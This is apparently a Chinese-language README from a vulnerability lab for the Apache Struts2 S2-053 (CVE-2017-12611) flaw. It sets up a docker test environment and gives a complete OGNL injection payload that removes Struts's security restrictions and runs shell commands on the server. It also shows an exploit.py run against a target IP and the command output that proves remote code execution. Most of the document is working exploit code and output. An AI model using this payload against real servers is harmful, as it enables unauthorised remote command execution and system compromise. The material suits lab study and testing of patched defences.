# S2-053-CVE-2017-12611
struts2-2.3.33下载
http://apache.uberglobalmirror.com/struts/2.3.33/

# 测试环境
```
docker-compose build
docker-compose up -d
```
# Poc
```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

# 脚本使用方法
```
 python exploit.py "http://10.160.11.191:8080" "name" "uname -a"
[*] Generated EXP: http://10.160.11.191:8080/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27uname%20-a%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D

[*] Exploiting...
[+] Response: <html>
<head>
<title>S2-053 Demo</title>
</head>
<body>
<h1>S2-053 Demo</h1>
<hr/>
Your name: Linux 8f7d2ffe7b33 3.13.0-61-generic ;jsessionid=861BDA02BAF82F0455B504C30E742AA0#100-Ubuntu SMP Wed Jul 29 11:21:34 UTC 2015 x86_64 GNU/Linux

<hr/>
Enter your name here:<br/>
<form action="" method="get">
<input type="text" name="name" value="" />
<input type="submit" value="Submit" />
</form>
<br/><br/><br/>
<p>See more at: <a href="https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053">VulApps - S2-053</a></p>
</body>
</html>

[+] Exploit Finished!
```
    
# 参考
* https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
* https://struts.apache.org/docs/s2-053.html
* https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
* http://www.freebuf.com/vuls/147735.html
